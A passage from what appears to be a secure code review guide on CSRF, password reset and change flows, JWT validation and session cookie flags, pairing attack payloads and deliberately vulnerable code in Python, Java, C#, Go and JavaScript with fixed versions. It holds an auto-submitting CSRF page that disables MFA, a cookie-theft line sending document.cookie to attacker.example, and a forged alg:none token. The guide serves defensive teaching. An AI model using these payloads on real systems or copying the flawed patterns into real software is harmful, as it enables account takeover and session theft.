    return Ok();
}
```

### HTML

```html
<!-- evil.example.com/disable-mfa.html — victim's browser auto-POSTs with session cookies -->
<html>
  <body onload="document.forms[0].submit()">
    <form action="https://app.example/account/mfa/disable" method="POST">
      <input type="hidden" name="confirm" value="true"/>
    </form>
  </body>
</html>
```

### JavaScript

```javascript
// SPA calls state-changing API with cookies only — no synchronizer token
fetch('/api/billing/upgrade', {
  method: 'POST',
  credentials: 'include',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ plan: 'enterprise' }),
});
```

### Go

```go
func disableMfa(w http.ResponseWriter, r *http.Request) {
    cookie, _ := r.Cookie("session")
    userID := sessions.Get(cookie.Value)
    db.Exec("UPDATE users SET mfa_enabled = false WHERE id = ?", userID)
    w.WriteHeader(http.StatusOK)
}
```

## Fix: Safer Patterns and Libraries to Use

### Python

Enable CSRF protection on state-changing routes. Use SameSite cookies as defense in depth.

```python
from flask import Flask, render_template, request, session
from flask_wtf.csrf import CSRFProtect

app = Flask(__name__)
app.config["SECRET_KEY"] = os.environ["SECRET_KEY"]
app.config["SESSION_COOKIE_SAMESITE"] = "Lax"
app.config["SESSION_COOKIE_SECURE"] = True
csrf = CSRFProtect(app)

@app.route("/account/mfa/disable", methods=["POST"])
def disable_mfa():
    if "user_id" not in session:
        return redirect("/login")
    db.execute("UPDATE users SET mfa_enabled = 0 WHERE id = ?", (session["user_id"],))
    return "MFA disabled"
```

```html
<!-- mfa_settings.html -->
<form method="post">
  <input type="hidden" name="csrf_token" value="{{ csrf_token() }}"/>
  <button type="submit">Disable MFA</button>
</form>
```

**Important:** Django CSRF middleware and FastAPI starlette-csrf provide equivalent protection. Never mark sensitive POST handlers `@csrf_exempt` without documented exceptions.

### Java

Spring Security enables CSRF by default for session-backed apps.

```java
// SecurityConfig — CSRF enabled (default); SPA header pattern:
http.csrf(csrf -> csrf
    .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse()));
```

```html
<form action="/wire" method="post">
  <input type="hidden" name="${_csrf.parameterName}" value="${_csrf.token}"/>
  <!-- fields -->
</form>
```

**Important:** Supplement tokens with `SameSite=Lax` or `Strict` on session cookies. Require reauthentication for MFA removal and payouts.

### C#

Use anti-forgery tokens on MVC and Razor POST actions.

```csharp
[HttpPost]
[ValidateAntiForgeryToken]
[Authorize]
public IActionResult DisableMfa()
{
    _mfaService.Disable(UserId);
    return Ok();
}
```

```cshtml
<form asp-action="DisableMfa" method="post">
  @Html.AntiForgeryToken()
  <button type="submit">Disable MFA</button>
</form>
```

```csharp
// SPA: inject IAntiforgery and require X-CSRF-TOKEN header
services.AddAntiforgery(options => options.HeaderName = "X-CSRF-TOKEN");
```

**Important:** Separate role changes from anonymous or CSRF-exempt endpoints. Set `CookieOptions.SameSite = SameSiteMode.Strict` for auth cookies in production.

### Go

Use gorilla/csrf middleware or custom synchronizer tokens stored server-side.

```go
import (
    "github.com/gorilla/csrf"
    "github.com/gorilla/sessions"
)

func main() {
    r := mux.NewRouter()
    csrfKey := []byte(os.Getenv("CSRF_KEY"))
    r.HandleFunc("/account/mfa/disable", disableMfa).Methods("POST")
    http.ListenAndServe(":8080",
        csrf.Protect(csrfKey, csrf.Secure(true))(r))
}
```

```html
<form action="/account/mfa/disable" method="POST">
  <input type="hidden" name="gorilla.csrf.Token" value="{{ .CSRFToken }}"/>
  <button type="submit">Disable MFA</button>
</form>
```

**Important:** Set `SameSite: http.SameSiteStrictMode` on session cookies. Prefer Bearer tokens with explicit client storage for pure APIs when cookies are not required.

## Broken password lifecycle {: #password }

From former `4-19-review-broken-password-lifecycle.md`. **Guiding chapter section:** [4.5 - Review Authentication, Session, and Access Control § Broken password lifecycle](../../4-05-review-authentication-session-and-access.md#password).

# 4.19 Code Reference — Review Broken Password Lifecycle

## Abuse Scenarios

Use these in authorized tests on reset, change, and MFA flows. They abuse weak lifecycle controls—not injection payloads.

### Pattern 1: Predictable or reusable reset token

```text
token = md5(email)           # same token for same user every request
token = user_id + "-" + date # enumerable
Reset link reused after successful password change
```

### Pattern 2: Password change without current password

```http
POST /account/password
{"userId": 42, "newPassword": "Attacker1!"}
# Authenticated as user 7, changes user 42
```

### Pattern 3: Reset token in URL logged by proxies

```text
https://app.example/reset?token=abc123
# Referrer, browser history, server access logs retain token
```

### Pattern 4: User enumeration on reset

```text
POST /reset {"email":"exists@corp.com"}   → 200 "email sent"
POST /reset {"email":"nobody@corp.com"}   → 404 "unknown email"
```

### Pattern 5: MFA disable without step-up

```http
POST /mfa/disable
Cookie: session=victim
# No TOTP or password re-entry
```

## Language-Specific Sinks and Dangerous APIs

Trace registration, change, reset, and MFA disable from HTTP handler to credential store.

### Python

```python
PASSWORD_STORE[user] = hashlib.md5(pw.encode()).hexdigest()
token = hashlib.sha256(email.encode()).hexdigest()
@app.route("/mfa/disable", methods=["POST"])
def disable_mfa(): session["mfa"] = False
```

Flask/Django: reset views without `check_password` on change; tokens stored in plain DB columns.

### Java

```java
MessageDigest.getInstance("MD5").digest(password.getBytes());
String token = String.valueOf(user.getId());  // predictable reset
userService.updatePassword(userId, newPw);  // no current password check
```

Spring Security: `PasswordEncoder` legacy MD5; custom reset without `TokenStore` expiry and single-use.

### C#

```csharp
var hash = MD5.Create().ComputeHash(Encoding.UTF8.GetBytes(password));
var token = Guid.NewGuid().ToString().Substring(0, 6);  // short entropy
await _userManager.ResetPasswordAsync(userId, token, newPassword);  // no prior auth
```

ASP.NET Identity: weak token provider, `AllowAnonymous` on change-password, MFA off without 2FA challenge.

### JavaScript (Node.js)

```javascript
const token = crypto.createHash('md5').update(email).digest('hex');
app.post('/reset/confirm', (req, res) => setPassword(req.body.userId, req.body.password));
app.post('/mfa/disable', requireSession, disableMfa);
```

bcrypt missing on register; reset tokens in JWT without rotation; logs printing reset URLs.

### Go

```go
h := md5.Sum([]byte(password))
token := fmt.Sprintf("%d-%s", userID, time.Now().Format("20060102"))
userRepo.SetPassword(req.FormValue("user_id"), newPass)  // no session bind
```

### PHP

```php
$hash = md5($password);
$token = md5($email);
if ($_POST['disable_mfa']) { $_SESSION['mfa'] = false; }
```

WordPress/Laravel: weak `password_hash` options, reset without `Hash::check` on old password.

## Vulnerable Examples in Other Languages

### Java

```java
@PostMapping("/register")
public void register(@RequestParam String username, @RequestParam String password) {
    userRepository.save(new User(username, password)); // plain text
}

@PostMapping("/password/change")
public void changePassword(@RequestParam Long userId,
                           @RequestParam String newPassword) {
    userRepository.updatePassword(userId, newPassword);
}

@PostMapping("/password/reset/confirm")
public void confirmReset(@RequestParam String token, @RequestParam String newPassword) {
    ResetToken t = tokenRepo.findByToken(token);
    if (t != null) {
        userRepository.updatePassword(t.getUserId(), newPassword);
    }
}
```

### C#

```csharp
[HttpPost("change-password")]
public IActionResult ChangePassword(ChangePasswordDto dto)
{
    var user = _db.Users.Find(dto.UserId);
    user.PasswordHash = dto.NewPassword;
    _db.SaveChanges();
    return Ok();
}
```

### Go

```go
func resetConfirm(w http.ResponseWriter, r *http.Request) {
    token := r.FormValue("token")
    pw := r.FormValue("password")
    row := db.QueryRow("SELECT user_id FROM reset_tokens WHERE token = ?", token)
    var uid int
    row.Scan(&uid)
    hash, _ := bcrypt.GenerateFromPassword([]byte(pw), 4)
    db.Exec("UPDATE users SET password = ? WHERE id = ?", string(hash), uid)
}
```

## Fix: Safer Patterns and Libraries to Use

### Python

Use Argon2 or bcrypt via passlib. Issue random reset tokens with constant-time responses.

```python
from argon2 import PasswordHasher
from passlib.context import CryptContext
import secrets
import hashlib

ph = PasswordHasher()
pwd_context = CryptContext(schemes=["argon2"], deprecated="auto")

@app.route("/reset", methods=["POST"])
def reset_password():
    email = request.form["email"]
    user = db.users.find_one({"email": email})
    if user:
        token = secrets.token_urlsafe(32)
        token_hash = hashlib.sha256(token.encode()).hexdigest()
        db.reset_tokens.insert_one({
            "user_id": user["_id"],
            "token_hash": token_hash,
            "expires": datetime.utcnow() + timedelta(minutes=30),
            "used": False,
        })
        send_mail(email, f"https://app/reset?token={token}")
    return "If that email exists, a reset link was sent.", 200

@app.route("/password/change", methods=["POST"])
@login_required
def change_password():
    if not pwd_context.verify(request.form["current"], current_user.password_hash):
        abort(403)
    current_user.password_hash = ph.hash(request.form["new"])
    current_user.save()
    return "ok"
```

**Important:** Use django-otp or pyotp for MFA on sensitive settings. Consider Have I Been Pwned k-anonymity checks on password set.

### Java

Use Spring `PasswordEncoder` and secure reset tokens with single-use invalidation.

```java
@PostMapping("/register")
public void register(@RequestParam String username, @RequestParam String password) {
    userRepository.save(new User(username, passwordEncoder.encode(password)));
}

@PostMapping("/password/change")
@PreAuthorize("isAuthenticated()")
public void changePassword(@AuthenticationPrincipal User user,
                           @RequestParam String currentPassword,
                           @RequestParam String newPassword) {
    if (!passwordEncoder.matches(currentPassword, user.getPasswordHash())) {
        throw new AccessDeniedException("invalid current password");
    }
    userService.updatePassword(user.getId(), passwordEncoder.encode(newPassword));
}

@PostMapping("/password/reset/confirm")
public void confirmReset(@RequestParam String token, @RequestParam String newPassword) {
    ResetToken t = tokenService.consumeToken(token); // single-use, hashed at rest
    userService.updatePassword(t.getUserId(), passwordEncoder.encode(newPassword));
}
```

**Important:** Force first-login change for admin-invited accounts. Require TOTP or WebAuthn to disable MFA.

### C#

Use ASP.NET Core Identity for change and reset flows.

```csharp
[HttpPost("change-password")]
[Authorize]
public async Task<IActionResult> ChangePassword(ChangePasswordDto dto)
{
    var user = await _userManager.GetUserAsync(User);
    var result = await _userManager.ChangePasswordAsync(
        user, dto.CurrentPassword, dto.NewPassword);
    if (!result.Succeeded) return BadRequest(result.Errors);
    return Ok();
}

[HttpPost("reset-password")]
public async Task<IActionResult> ResetPassword(ForgotPasswordDto dto)
{
    var user = await _userManager.FindByEmailAsync(dto.Email);
    if (user != null)
    {
        var token = await _userManager.GeneratePasswordResetTokenAsync(user);
        await _email.SendResetLinkAsync(user.Email, token);
    }
    return Ok(new { message = "If that email exists, a reset link was sent." });
}
```

**Important:** Configure `PasswordOptions` and lockout on brute force. Require MFA to remove authenticator factors.

### Go

Use bcrypt or Argon2 with appropriate cost. Store reset token hashes and delete after use.

```go
func resetConfirm(w http.ResponseWriter, r *http.Request) {
    token := r.FormValue("token")
    pw := r.FormValue("password")
    tokenHash := sha256Sum(token)
    var uid int64
    err := db.QueryRow(`
        SELECT user_id FROM reset_tokens
        WHERE token_hash = $1 AND expires_at > NOW() AND used = FALSE`, tokenHash).Scan(&uid)
    if err != nil {
        http.Error(w, "invalid token", http.StatusBadRequest)
        return
    }
    hash, _ := bcrypt.GenerateFromPassword([]byte(pw), bcrypt.DefaultCost)
    tx, _ := db.Begin()
    tx.Exec("UPDATE users SET password = $1 WHERE id = $2", string(hash), uid)
    tx.Exec("UPDATE reset_tokens SET used = TRUE WHERE token_hash = $1", tokenHash)
    tx.Commit()
}
```

**Important:** Bind password change to verified session context only. Rate-limit reset and login endpoints.

## JWT security (code-level) {: #jwt }

From former `4-17-review-jwt-security.md`. **Guiding chapter section:** [4.5 - Review Authentication, Session, and Access Control § JWT security (code-level)](../../4-05-review-authentication-session-and-access.md#jwt).

# 4.17 Code Reference — Review JWT Security

## Attack Payloads

Use these in authorized tests against APIs that parse JWTs. Craft tokens only in environments you own; never use production user accounts without approval.

### Pattern 1: `alg: none` (signature stripped)

```text
Header:  {"alg":"none","typ":"JWT"}
Payload: {"sub":"admin","role":"admin"}
Signature: (empty)
Token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.
```

### Pattern 2: Forged HS256 with known or guessed secret

```text
# Sign with "secret", "changeme", or key from source leak
{"sub":"victim-user-id","admin":true} + HS256(secret)
```

### Pattern 3: Algorithm confusion (RS256 → HS256)

```text
# Use public RSA key as HMAC secret when server accepts both algs
Header: {"alg":"HS256",...}
Signed with -----BEGIN PUBLIC KEY----- material
```

### Pattern 4: Expired or missing `exp` accepted

```text
{"sub":"user1","exp":1}   # year 1970 — server skips exp check
{"sub":"user1"}           # no exp claim
```

### Pattern 5: Weak symmetric secret brute-forced offline

```python
# Attacker re-signs payload after cracking "dev-jwt-key-2024" from a container image layer
import jwt
jwt.encode({"sub": "admin", "scope": "billing:write"}, "dev-jwt-key-2024", algorithm="HS256")
```

## Language-Specific Sinks and Dangerous APIs

Find every path that decodes JWTs for authentication or authorization decisions.

### Python

```python
import jwt
jwt.decode(token, os.environ["JWT_SECRET"], algorithms=["HS256", "RS256", "none"])
jwt.get_unverified_header(token)  # used alone to pick HMAC key for confusion
```

PyJWT with permissive `algorithms=` list; `python-jose` `jwt.decode` without `aud`/`iss` checks.

### Java

```java
Jwts.parser().setSigningKey("secretkey").parseClaimsJws(jwt);
// Accepts alg from header without allowlist
Claims claims = Jwts.parser().parseClaimsJwt(unsigned).getBody();
```

`jjwt`, Nimbus, Spring Security OAuth2 resource server misconfiguration.

### C#

```csharp
var handler = new JwtSecurityTokenHandler();
handler.ValidateToken(token, new TokenValidationParameters {
    ValidateIssuerSigningKey = false,
    SignatureValidator = (t, _) => new JwtSecurityToken(t)
}, out _);
```

`System.IdentityModel.Tokens.Jwt`, Microsoft.AspNetCore.Authentication.JwtBearer.

### JavaScript (Node.js)

```javascript
const jwt = require('jsonwebtoken');
jwt.verify(token, secret, { algorithms: ['HS256', 'none'] });
jwt.decode(token);  // no verify
```

`jose`, `passport-jwt`, Auth0 SDK with `ignoreSignature` in tests left enabled in prod.

### Go

```go
jwt.Parse(token, func(t *jwt.Token) (interface{}, error) {
    return []byte("secret"), nil  // ignores expected alg
})
```

`github.com/golang-jwt/jwt`, `lestrrat-go/jwx` with permissive `alg` handling.

### Ruby

```ruby
JWT.decode(token, nil, false)  # verify disabled
JWT.decode(token, 'secret', true, { algorithm: 'none' })
```

## Vulnerable Examples in Other Languages

### Java

```java
public Claims authenticate(String jwtString) {
    return Jwts.parser()
        .setSigningKey("secretkey")
        .parseClaimsJws(jwtString)
        .getBody();
}

public User loadUser(String token) {
    String[] parts = token.split("\\.");
    String payload = new String(Base64.getUrlDecoder().decode(parts[1]));
    JsonNode node = mapper.readTree(payload);
    return new User(node.get("sub").asText(), node.get("role").asText());
}
```

### C#

```csharp
public ClaimsPrincipal Validate(string token)
{
    var handler = new JwtSecurityTokenHandler();
    var key = Encoding.UTF8.GetBytes("hardcoded-dev-secret");
    var parameters = new TokenValidationParameters
    {
        ValidateIssuer = false,
        ValidateAudience = false,
        IssuerSigningKey = new SymmetricSecurityKey(key)
    };
    return handler.ValidateToken(token, parameters, out _);
}
```

### JavaScript

```javascript
const jwt = require('jsonwebtoken');
function currentUser(req) {
  const token = req.headers.authorization?.slice(7);
  // verify disabled — accepts alg:none and arbitrary claims
  return jwt.verify(token, process.env.JWT_SECRET, { algorithms: ['HS256', 'none'] });
}
```

### Go

```go
func authMiddleware(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        raw := strings.TrimPrefix(r.Header.Get("Authorization"), "Bearer ")
        token, _, _ := new(jwt.Parser).ParseUnverified(raw, jwt.MapClaims{})
        claims := token.Claims.(jwt.MapClaims)
        ctx := context.WithValue(r.Context(), "role", claims["role"])
        next.ServeHTTP(w, r.WithContext(ctx))
    })
}
```

## Fix: Safer Patterns and Libraries to Use

### Python

Verify signature, algorithm, issuer, and audience with PyJWT. Load secrets from environment or JWKS.

```python
import jwt
import os

JWT_SECRET = os.environ["JWT_SECRET"]
JWT_AUDIENCE = "api.example.com"
JWT_ISSUER = "https://auth.example.com"

def current_user(auth_header: str) -> dict:
    token = auth_header.split(" ", 1)[1]
    return jwt.decode(
        token,
        JWT_SECRET,
        algorithms=["HS256"],
        audience=JWT_AUDIENCE,
        issuer=JWT_ISSUER,
        options={"require": ["exp", "sub"]},
    )

def issue_token(user) -> str:
    return jwt.encode(
        {"sub": str(user.id), "scope": user.scopes},
        JWT_SECRET,
        algorithm="HS256",
        audience=JWT_AUDIENCE,
        issuer=JWT_ISSUER,
    )
```

**Important:** Never use `verify_signature=False` outside isolated tests. Prefer RS256 with JWKS for multi-service trust.

### Java

Use jjwt or Nimbus with explicit parser configuration. Reject unsigned algorithms.

```java
public Claims authenticate(String jwtString) {
    byte[] key = keyResolver.resolveSigningKey(jwtString);
    return Jwts.parserBuilder()
        .setSigningKey(key)
        .requireIssuer("https://auth.example.com")
        .requireAudience("api.example.com")
        .build()
        .parseClaimsJws(jwtString)
        .getBody();
}
```

**Important:** Fetch signing keys from issuer JWKS with `kid` matching. Use short-lived access tokens with refresh flow and server-side revocation where needed.

### C#

Configure `AddJwtBearer` with full validation parameters.

```csharp
services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme)
    .AddJwtBearer(options =>
    {
        options.TokenValidationParameters = new TokenValidationParameters
        {
            ValidateIssuer = true,
            ValidIssuer = "https://auth.example.com",
            ValidateAudience = true,
            ValidAudience = "api.example.com",
            ValidateLifetime = true,
            ValidateIssuerSigningKey = true,
            IssuerSigningKey = new SymmetricSecurityKey(
                Encoding.UTF8.GetBytes(Configuration["Jwt:Key"]!)),
            ValidAlgorithms = new[] { SecurityAlgorithms.HmacSha256 }
        };
    });
```

**Important:** Use Azure AD or IdentityServer metadata and JWKS instead of custom crypto when possible.

### Go

Parse with explicit algorithm list in `keyFunc`. Set user context only after `token.Valid`.

```go
import "github.com/golang-jwt/jwt/v5"

func authMiddleware(next http.Handler) http.Handler {
    secret := []byte(os.Getenv("JWT_SECRET"))
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        raw := strings.TrimPrefix(r.Header.Get("Authorization"), "Bearer ")
        token, err := jwt.Parse(raw, func(t *jwt.Token) (any, error) {
            if t.Method.Alg() != jwt.SigningMethodHS256.Alg() {
                return nil, fmt.Errorf("unexpected alg")
            }
            return secret, nil
        }, jwt.WithAudience("api.example.com"), jwt.WithIssuer("https://auth.example.com"))
        if err != nil || !token.Valid {
            http.Error(w, "unauthorized", http.StatusUnauthorized)
            return
        }
        claims := token.Claims.(jwt.MapClaims)
        ctx := context.WithValue(r.Context(), "sub", claims["sub"])
        next.ServeHTTP(w, r.WithContext(ctx))
    })
}
```

**Important:** Use `coreos/go-oidc` for standard OIDC issuers. Apply small clock leeway with `jwt.WithLeeway` while still enforcing `exp`.

## Insecure cookie configuration {: #cookies }

From former `4-34-review-insecure-cookie-configuration.md`. **Guiding chapter section:** [4.5 - Review Authentication, Session, and Access Control § Insecure cookie configuration](../../4-05-review-authentication-session-and-access.md#cookies).

# 4.34 Code Reference — Review Insecure Cookie Configuration

## Attack Payloads

Use these in authorized tests on login and session endpoints. Abuse scenarios include XSS cookie theft, network capture, and CSRF with permissive SameSite.

### Pattern 1: Missing HttpOnly (XSS theft abuse scenario)

```javascript
// After any XSS on the origin
document.cookie  // returns "session=abc123" when HttpOnly absent
fetch('https://attacker.example/?c='+document.cookie)
```

### Pattern 2: Missing Secure over HTTP

```http
GET http://app.example/ HTTP/1.1
Cookie: session=abc123
```

Cleartext transport exposes the session on untrusted networks.

### Pattern 3: SameSite absent or None without Secure

```http
# Cross-site POST from attacker.example with victim browser
POST https://app.example/transfer HTTP/1.1
Cookie: session=victim_session
Origin: https://attacker.example
```

### Pattern 4: Overly long session lifetime

```http
Set-Cookie: session=abc; Max-Age=31536000; Path=/
```

Stolen cookies remain valid for a year.

### Pattern 5: Session fixation via attacker-set cookie

```http
Set-Cookie: session=attacker_chosen_id; Path=/
# Victim logs in while browser already holds attacker-known id
```

### Pattern 6: Logout without server invalidation

```javascript
document.cookie = "session=; Max-Age=0";  // client cleared
// Server-side session store still accepts session=abc123
```

## Language-Specific Sinks and Dangerous APIs

Search every `Set-Cookie` path and framework session configuration.

### Python

```python
response.set_cookie("auth_token", token, httponly=False, secure=False)
settings.SESSION_COOKIE_HTTPONLY = False
settings.CSRF_COOKIE_SECURE = False
```

Flask `session` defaults; Django `SESSION_COOKIE_HTTPONLY = False`; Starlette `set_cookie` without flags.

### Java

```java
Cookie c = new Cookie("JSESSIONID", id);
c.setHttpOnly(false);
c.setSecure(false);
response.addCookie(c);
```

`server.servlet.session.cookie.http-only=false` in `application.properties`; Spring `CookieSerializer` customizations.

### C#

```csharp
Response.Cookies.Append("session", id);  // default flags may omit HttpOnly/Secure
options.Cookie.HttpOnly = false;
options.Cookie.SecurePolicy = CookieSecurePolicy.None;
```

ASP.NET Core `CookieAuthenticationOptions`; legacy `FormsAuthentication` cookie settings.

### JavaScript (Node.js)

```javascript
res.cookie("session", sid, { httpOnly: false, secure: false, sameSite: false });
cookieSession({ name: "session", secure: false });
```

`express-session` defaults without `cookie.secure` behind TLS terminators.

### Go

```go
http.SetCookie(w, &http.Cookie{Name: "session", Value: sid})  // no HttpOnly/Secure
```

Gorilla sessions, `echo` cookie middleware without explicit flags.

### Servlet deployment descriptors

```xml
<session-config>
  <cookie-config>
    <http-only>false</http-only>
    <secure>false</secure>
  </cookie-config>
</session-config>
```

## Vulnerable Examples in Other Languages

### Java

```java
public void login(HttpServletResponse response, String sessionId) {
    Cookie session = new Cookie("session", sessionId);
    // Missing HttpOnly, Secure, and SameSite — readable by JS and sent over HTTP
    response.addCookie(session);
}

public void rememberMe(HttpServletResponse response, String sessionId) {
    Cookie session = new Cookie("session", sessionId);
    session.setMaxAge(60 * 60 * 24 * 365); // one year — exceeds policy
    response.addCookie(session);
}
```

```xml
<!-- web.xml: http-only set but Secure and SameSite not configured -->
<session-config>
   <cookie-config>
       <http-only>true</http-only>
       <max-age>600</max-age>
   </cookie-config>
</session-config>
```

### C#

```csharp
Response.Cookies.Append("session", sessionId, new CookieOptions
{
    HttpOnly = false,
    Secure = false
});

Response.Cookies.Append("session", longLivedSessionId, new CookieOptions
{
    HttpOnly = false,
    Secure = false,
    Expires = DateTimeOffset.UtcNow.AddYears(1)
});
```

### Go

```go
http.SetCookie(w, &http.Cookie{
    Name:  "session",
    Value: sessionID,
    Path:  "/",
    // HttpOnly, Secure, and SameSite left at zero values
})

http.SetCookie(w, &http.Cookie{
    Name:   "session",
    Value:  longLivedSessionID,
    Path:   "/",
    MaxAge: 60 * 60 * 24 * 365,
})
```

## Fix: Safer Patterns and Libraries to Use

### Python

Configure Flask or Django session cookies with explicit flags.

```python
app.config.update(
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SECURE=True,
    SESSION_COOKIE_SAMESITE="Lax",
    PERMANENT_SESSION_LIFETIME=timedelta(hours=8),
)

@require_POST
def login(request):
    session_key = create_session(request.POST["username"], request.POST["password"])
    response = HttpResponseRedirect("/dashboard")
    response.set_cookie(
        "auth_token",
        session_key,
        httponly=True,
        secure=True,
        samesite="Lax",
        max_age=8 * 3600,
    )
    return response
```

Pair Secure cookies with HTTPS enforcement and HSTS. See [Flask session configuration](https://flask.palletsprojects.com/en/stable/config/#SESSION_COOKIE_SECURE) and [Django cookie settings](https://docs.djangoproject.com/en/stable/ref/settings/#session-cookie-secure).

### Java

Set flags explicitly on every auth cookie. Use Spring Boot session properties for container defaults.

```java
public static void setSessionCookie(HttpServletResponse response, String name, String value) {
    Cookie cookie = new Cookie(name, value);
    cookie.setHttpOnly(true);
    cookie.setSecure(true);
    cookie.setPath("/");
    cookie.setAttribute("SameSite", "Strict");
    cookie.setMaxAge(3600);
    response.addCookie(cookie);
}
```

```yaml
# application.yml
server:
  servlet:
    session:
      cookie:
        http-only: true
        secure: true
        same-site: strict
```

See [Servlet Cookie API](https://jakarta.ee/specifications/servlet/6.0/apidocs/jakarta.servlet/jakarta/servlet/http/Cookie.html) and [Spring Boot session cookie properties](https://docs.spring.io/spring-boot/docs/current/reference/html/application-properties.html#application-properties.server.server.servlet.session.cookie).

### C#

Use `CookieOptions` with consistent flags on authentication handlers.

```csharp
Response.Cookies.Append("AuthToken", token, new CookieOptions
{
    HttpOnly = true,
    Secure = true,
    SameSite = SameSiteMode.Strict,
    Expires = DateTimeOffset.UtcNow.AddHours(8),
    IsEssential = true
});
```

Configure cookie authentication in `Program.cs` with the same flags. See [ASP.NET Core cookie options](https://learn.microsoft.com/en-us/aspnet/core/security/authentication/cookie).

### Go

Set explicit fields on session cookies. Ensure TLS termination sets `X-Forwarded-Proto` for Secure cookies behind load balancers.

```go
http.SetCookie(w, &http.Cookie{
    Name:     "session",
    Value:    sessionID,
    Path:     "/",
    MaxAge:   3600,
    HttpOnly: true,
    Secure:   true,
    SameSite: http.SameSiteStrictMode,
})
```

With [gorilla/sessions](https://github.com/gorilla/sessions), configure store `Options` with production-safe defaults.

